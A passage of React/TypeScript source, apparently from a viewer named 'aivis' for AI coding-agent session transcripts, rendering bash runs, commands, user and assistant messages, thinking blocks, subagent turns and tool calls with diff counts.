      <img src={url} alt={alt ?? ''} onError={() => setFailed(true)} />
      {alt ? <span className="md-image__cap">{alt}</span> : null}
    </a>
  )
}

/**
 * Element overrides for rendered markdown.
 *
 * A table gets its own scrolling wrapper so a wide one scrolls inside the message
 * instead of widening the page, a link opens in a new tab rather than replacing the
 * session view, and an image is resolved against the filesystem when it names a path —
 * or shown as an address rather than fetched when it names another site.
 */
function markdownComponents(sessionId: string) {
  return {
    table: (props: { children?: React.ReactNode }) => (
      <div className="md-table">
        <table>{props.children}</table>
      </div>
    ),
    a: (props: { href?: string; children?: React.ReactNode }) => (
      <a href={props.href} target="_blank" rel="noreferrer noopener">
        {props.children}
      </a>
    ),
    img: (props: { src?: string; alt?: string }) => (
      <MessageImage src={props.src} alt={props.alt} sessionId={sessionId} />
    ),
  }
}

function Entry({
  entry,
  cwd,
  sessionId,
}: {
  entry: TranscriptEntry
  cwd: string
  sessionId: string
}): React.JSX.Element | null {
  if (entry.kind === 'bash') {
    // Three states share one shape. A run still going shows what it has printed so far and
    // says so; a finished one waiting to be sent says where it is going, because the reason
    // it is on screen but not in the conversation is not otherwise guessable; a run read back
    // out of the transcript is just history and says nothing extra.
    const gutter = entry.running ? 'running' : entry.pending ? 'queued' : 'bash'
    return (
      <div
        className={`entry entry--bash${entry.pending ? ' entry--bash-pending' : ''}`}
        id={`entry-${entry.uuid}`}
      >
        <div className="entry__gutter" title="run on this machine, not by the model">
          {gutter}
        </div>
        <div className="entry__body">
          <span className="cmdrun">! {entry.command}</span>
          {entry.stdout ? <pre className="bashout">{entry.stdout}</pre> : null}
          {entry.stderr ? <pre className="bashout bashout--err">{entry.stderr}</pre> : null}
          {entry.pending && !entry.running ? (
            <p className="bashout__note">goes to the session with your next message</p>
          ) : null}
        </div>
      </div>
    )
  }

  if (entry.kind === 'command') {
    return (
      <div className="entry entry--command" id={`entry-${entry.uuid}`}>
        <div className="entry__gutter">command</div>
        <div className="entry__body">
          <span className="cmdrun">{entry.text}</span>
          {entry.output ? <p className="cmdrun__out">{entry.output}</p> : null}
        </div>
      </div>
    )
  }

  if (entry.kind === 'queued') {
    // Sent from this page rather than typed into the terminal. The gutter says which,
    // because the two land in the same conversation but do not carry the same authority.
    const mine = entry.from === 'aivis'
    return (
      <div className="entry entry--queued" id={`entry-${entry.uuid}`}>
        <div className="entry__gutter" title={`pushed into the session by ${entry.from}`}>
          {mine ? 'aivis' : entry.from}
        </div>
        <div className="entry__body">
          <Attached sessionId={sessionId} uuid={entry.uuid} images={entry.images} />
          {entry.text}
        </div>
      </div>
    )
  }

  if (entry.kind === 'user') {
    return (
      <div className="entry entry--user" id={`entry-${entry.uuid}`}>
        <div className="entry__gutter">you</div>
        <div className="entry__body">
          <Attached sessionId={sessionId} uuid={entry.uuid} images={entry.images} />
          {entry.text}
        </div>
      </div>
    )
  }

  if (entry.kind === 'assistant') {
    return (
      <div className={`entry entry--assistant ${entry.sidechain ? 'entry--sub' : ''}`}>
        <div className="entry__gutter">{entry.sidechain ? 'subagent' : 'claude'}</div>
        <div className="entry__body entry__body--md">
          {entry.thinking ? (
            <details className="thinking">
              <summary>thinking</summary>
              <div className="thinking__body">{entry.thinking}</div>
            </details>
          ) : null}
          <Markdown remarkPlugins={[remarkGfm]} components={markdownComponents(sessionId)}>
            {entry.text}
          </Markdown>
        </div>
      </div>
    )
  }

  const { call } = entry
  const summary = toolSummary(call.name, call.input).replace(/\s+/g, ' ').trim()
  const relative = summary.startsWith(cwd) ? summary.slice(cwd.length + 1) : summary
  // A file edit reads as a diff; everything else keeps the raw input, which is the only
  // faithful thing to show for a tool whose shape aivis does not know.
  const diffs = toolDiffs(call.name, call.input)
  const added = diffs?.reduce((sum, d) => sum + d.added, 0) ?? 0
  const removed = diffs?.reduce((sum, d) => sum + d.removed, 0) ?? 0

  return (
    <details id={`tool-${call.id}`} className={`tool-entry ${call.isError ? 'tool-entry--error' : ''}`}>
      <summary>
        <span className="tool">{call.name}</span>
        <span className="tool__detail">{relative}</span>
        {diffs ? (
          // Each figure keeps its slot even when it is zero, so the counts read down as a
          // column beside the clock rather than moving with the length of the path.
          <span className="tool__counts">
            <span className="diff__plus">{added > 0 ? `+${added}` : ''}</span>
            <span className="diff__minus">{removed > 0 ? `−${removed}` : ''}</span>
          </span>
        ) : null}
        <span className="tool__time">{clock(entry.at)}</span>
      </summary>
      <div className="tool-entry__body">
        {diffs ? (
          <DiffView diffs={diffs} cwd={cwd} />
        ) : (
          <pre className="tool-entry__input">{JSON.stringify(call.input, null, 2)}</pre>
        )}
        {call.result === null ? (
          <p className="tool-entry__pending">running…</p>
        ) : (
          <pre className="tool-entry__result">
            {call.result}
            {call.resultTruncated ? '\n\n… result truncated' : ''}
          </pre>
        )}
      </div>
    </details>
  )
}
